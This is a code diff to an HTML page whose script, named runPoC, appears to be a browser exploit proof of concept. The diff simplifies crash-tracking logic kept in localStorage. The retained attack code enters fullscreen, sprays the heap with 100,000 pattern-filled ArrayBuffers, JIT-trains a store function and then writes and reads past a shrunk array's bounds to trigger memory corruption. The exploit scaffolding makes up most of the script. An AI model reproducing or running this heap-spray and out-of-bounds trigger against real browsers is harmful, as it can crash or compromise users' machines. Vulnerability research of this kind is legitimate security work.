@@ -153,29 +153,13 @@ body {
 </div>
 <script>
 window.onload = () => {
-  const crashed = localStorage.getItem("wasAboutToCrash");
-  const timestamp = localStorage.getItem("crashTimestamp");
+  const lastTime = parseInt(localStorage.getItem("crashTime") || "0");
+  const now = Date.now();
+  const elapsed = Math.floor((now - lastTime) / 1000);
 
-  if (crashed === "yes" && timestamp) {
-    const now = Date.now();
-    const elapsed = Math.floor((now - Number(timestamp)) / 1000);
-
-    if (elapsed > 5) { // asegura que sea después del crash real
-      let count = parseInt(localStorage.getItem("crashCount") || "0");
-      count++;
-      localStorage.setItem("crashCount", count.toString());
-
-      setTimeout(() => {
-        alert(
-          `⚠️ Last run may have triggered instability or crash.\n` +
-          `⏱ Elapsed since crash: ${elapsed}s\n` +
-          `💥 Total crashes detected: ${count}`
-        );
-      }, 200);
-    }
-
-    localStorage.removeItem("wasAboutToCrash");
-    localStorage.removeItem("crashTimestamp");
+  if (lastTime && elapsed > 4) {
+    alert(`⚠️ Last run may have triggered instability or crash.\nElapsed: ${elapsed}s`);
+    localStorage.removeItem("crashTime");
   }
 };
 
@@ -183,39 +167,34 @@ function runPoC() {
   document.getElementById("message").textContent =
     "Fullscreen activated...\nSpraying memory...";
 
-  // Guardar el estado de posible crash
-  localStorage.setItem("wasAboutToCrash", "yes");
-  localStorage.setItem("crashTimestamp", Date.now().toString());
+  localStorage.setItem("crashTime", Date.now().toString());
 
-  // Delay para asegurar persistencia
-  setTimeout(() => {
-    document.body.requestFullscreen().then(() => {
-      const PATTERN = 0x43434343;
-      const SPRAY_CNT = 100000;
-      const SPRAY_LEN = 16;
+  document.body.requestFullscreen().then(() => {
+    const PATTERN   = 0x43434343;
+    const SPRAY_CNT = 100000;
+    const SPRAY_LEN = 16;
 
-      const spray = [];
-      for (let i = 0; i < SPRAY_CNT; i++) {
-        const buf = new ArrayBuffer(SPRAY_LEN * 4);
-        const u32 = new Uint32Array(buf);
-        for (let j = 0; j < u32.length; j++) u32[j] = PATTERN;
-        spray.push({ u32, f64: new Float64Array(buf) });
-      }
+    const spray = [];
+    for (let i = 0; i < SPRAY_CNT; i++) {
+      const buf = new ArrayBuffer(SPRAY_LEN * 4);
+      const u32 = new Uint32Array(buf);
+      for (let j = 0; j < u32.length; j++) u32[j] = PATTERN;
+      spray.push({ u32, f64: new Float64Array(buf) });
+    }
 
-      let victim = [1.1, 2.2, 3.3, 4.4];
-      function opt(arr, idx, val) { arr[idx] = val; }
+    let victim = [1.1, 2.2, 3.3, 4.4];
+    function opt(arr, idx, val) { arr[idx] = val; }
 
-      for (let i = 0; i < 10000; i++) opt(victim, 1, 5.5);
-      victim.length = 1;
-      const TRIGGER_IDX = 3;
-      opt(victim, TRIGGER_IDX, 13.37);
-      let read = victim[TRIGGER_IDX];
+    for (let i = 0; i < 10000; i++) opt(victim, 1, 5.5);
+    victim.length = 1;
+    const TRIGGER_IDX = 3;
+    opt(victim, TRIGGER_IDX, 13.37);
+    let read = victim[TRIGGER_IDX];
 
-      document.getElementById("popup").style.display = "block";
-    }).catch(err => {
-      document.getElementById("message").textContent = "Error: " + err.message;
-    });
-  }, 500);
+    document.getElementById("popup").style.display = "block";
+  }).catch(err => {
+    document.getElementById("message").textContent = "Error: " + err.message;
+  });
 }
 </script>
 
